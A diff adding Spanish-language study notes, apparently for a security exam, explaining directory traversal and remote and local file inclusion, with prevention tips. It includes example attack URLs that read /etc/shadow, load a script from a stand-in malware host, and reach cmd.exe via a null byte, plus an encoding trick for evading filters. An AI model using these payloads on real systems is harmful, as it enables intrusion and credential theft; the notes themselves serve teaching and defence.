@@ -425,3 +425,334 @@ El secuestro de dominios implica cambios no autorizados en el registro de un dom
 copia de los datos de la zona DNS de un dominio.
 
 Comprendiendo cómo actúan estos ataques se pueden establecer fácilmente mecanismos para evitar que se produzcan.
+
+# Ataques de Directory Traversal e Inclusión de Archivos
+
+## ¿Qué es un Directory Traversal?
+
+Es un **ataque de inyección** donde un atacante manipula la URL o los parámetros de una aplicación web para acceder a **archivos y directorios fuera de la carpeta raíz (Web Root)**.
+
+Su objetivo es **leer archivos sensibles** o **ejecutar archivos del sistema**.
+
+### Ejemplo
+
+Estructura del servidor:
+
+```text
+/
+├── etc
+│   └── shadow
+└── home
+    └── programs
+        └── www_root
+            └── index.php
+```
+
+Si el atacante escribe:
+
+```text
+https://sitio.com/../../../etc/shadow
+```
+
+Los `../` hacen que el sistema suba directorios hasta llegar a:
+
+```text
+/etc/shadow
+```
+
+Si el servidor está mal configurado, el atacante podrá leer ese archivo.
+
+---
+
+### ¿Qué significa `../`?
+
+```text
+../
+```
+
+Significa:
+
+> "Sube un nivel en la estructura de carpetas."
+
+Ejemplo:
+
+Directorio actual:
+
+```text
+/home/programs/www_root
+```
+
+Con:
+
+```text
+../
+```
+
+queda:
+
+```text
+/home/programs
+```
+
+Otro `../`
+
+```text
+/home
+```
+
+Otro:
+
+```text
+/
+```
+
+Luego puede entrar a cualquier carpeta:
+
+```text
+/etc
+```
+
+---
+
+### ¿Por qué es peligroso?
+
+Porque puede permitir acceder a:
+
+- Archivos de contraseñas.
+- Archivos de configuración.
+- Claves privadas.
+- Bases de datos.
+- Scripts del servidor.
+- Otros archivos sensibles.
+
+Todo depende de los permisos configurados en el servidor.
+
+---
+
+### Linux vs Windows
+
+En Linux:
+
+```text
+../
+```
+
+usa la barra:
+
+```text
+/
+```
+
+En Windows normalmente se usa:
+
+```text
+..\
+```
+
+Aunque muchos servidores aceptan ambas.
+
+---
+
+### ¿Cómo ocultan el ataque?
+
+En lugar de escribir:
+
+```text
+../
+```
+
+pueden codificarlo como:
+
+```text
+%2e%2e%2f
+```
+
+donde:
+
+```text
+%2e = .
+%2f = /
+```
+
+Por lo tanto:
+
+```text
+%2e%2e%2f
+```
+
+equivale a:
+
+```text
+../
+```
+
+Esto ayuda a evadir algunos filtros de seguridad.
+
+---
+
+## Inclusión de Archivos (File Inclusion)
+
+Es una vulnerabilidad donde el atacante consigue que la aplicación cargue un archivo que no debería.
+
+Existen dos tipos:
+
+- Remote File Inclusion (RFI)
+- Local File Inclusion (LFI)
+
+---
+
+## 1. Remote File Inclusion (RFI)
+
+El atacante hace que el servidor cargue un archivo ubicado **en otro servidor de Internet**.
+
+Ejemplo:
+
+```text
+https://sitio.com/login.php?user=http://malware.com/malicioso.php
+```
+
+En lugar de cargar un usuario válido, intenta que el servidor ejecute:
+
+```text
+malicioso.php
+```
+
+que está alojado en otro sitio web.
+
+### Objetivo
+
+- Ejecutar malware.
+- Instalar una backdoor (puerta trasera).
+- Tomar control del servidor.
+
+---
+
+## 2. Local File Inclusion (LFI)
+
+Aquí el archivo **ya existe dentro del servidor**.
+
+El atacante utiliza un **Directory Traversal** para llegar hasta él.
+
+Ejemplo:
+
+```text
+https://sitio.com/login.php?user=../../../Windows/System32/cmd.exe%00
+```
+
+Está intentando ejecutar:
+
+```text
+cmd.exe
+```
+
+que ya existe en el servidor Windows.
+
+---
+
+### ¿Qué significa `%00`?
+
+```text
+%00
+```
+
+Es un **carácter nulo (Null Byte)**.
+
+Antes se utilizaba para engañar a algunas aplicaciones.
+
+Ejemplo:
+
+La aplicación esperaba:
+
+```text
+archivo.php
+```
+
+El atacante enviaba:
+
+```text
+cmd.exe%00
+```
+
+Algunos programas antiguos dejaban de leer la cadena en `%00`, ignorando el `.php` agregado automáticamente y permitiendo ejecutar `cmd.exe`.
+
+---
+
+### Diferencia entre RFI y LFI
+
+| Remote File Inclusion (RFI) | Local File Inclusion (LFI) |
+|-----------------------------|----------------------------|
+| Carga un archivo desde otro servidor. | Usa un archivo que ya existe en el servidor. |
+| Requiere una URL externa. | Utiliza rutas locales. |
+| Se utiliza para ejecutar malware remoto. | Se utiliza para acceder o ejecutar archivos locales. |
+
+---
+
+### ¿Cómo prevenir estos ataques?
+
+- Validar y sanitizar todas las entradas del usuario.
+- No permitir rutas arbitrarias.
+- Restringir el acceso únicamente al **Web Root**.
+- Configurar correctamente los permisos de archivos y carpetas.
+- Deshabilitar la inclusión de archivos remotos cuando no sea necesaria.
+- Filtrar secuencias como `../` y sus versiones codificadas (`%2e%2e%2f`).
+
+---
+
+### Para el examen (muy importante)
+
+✅ Si ves:
+
+```text
+../
+```
+
+o
+
+```text
+..\
+```
+
+Piensa inmediatamente en:
+
+> **Directory Traversal**
+
+También recuerda:
+
+> **Local File Inclusion (LFI)** normalmente utiliza **Directory Traversal** para llegar al archivo que quiere cargar.
+
+---
+
+### Esquema para memorizar
+
+```text
+Directory Traversal
+        │
+        ▼
+Permite salir del Web Root usando ../
+        │
+        ▼
+Accede a archivos sensibles
+        │
+        ▼
+Puede utilizarse en ataques de Local File Inclusion
+
+
+Remote File Inclusion (RFI)
+        │
+        ▼
+Carga un archivo desde otro servidor.
+
+
+Local File Inclusion (LFI)
+        │
+        ▼
+Carga un archivo que ya existe en el servidor.
+```
+
+### Resumen rápido
+
+- **Directory Traversal:** utiliza `../` para salir del Web Root y acceder a otros directorios.
+- **RFI:** carga un archivo remoto desde otro servidor.
+- **LFI:** carga un archivo local que ya existe en el servidor.
+- **`%2e%2e%2f`:** versión codificada de `../`.
+- **`%00`:** carácter nulo usado antiguamente para evadir algunos mecanismos de seguridad.
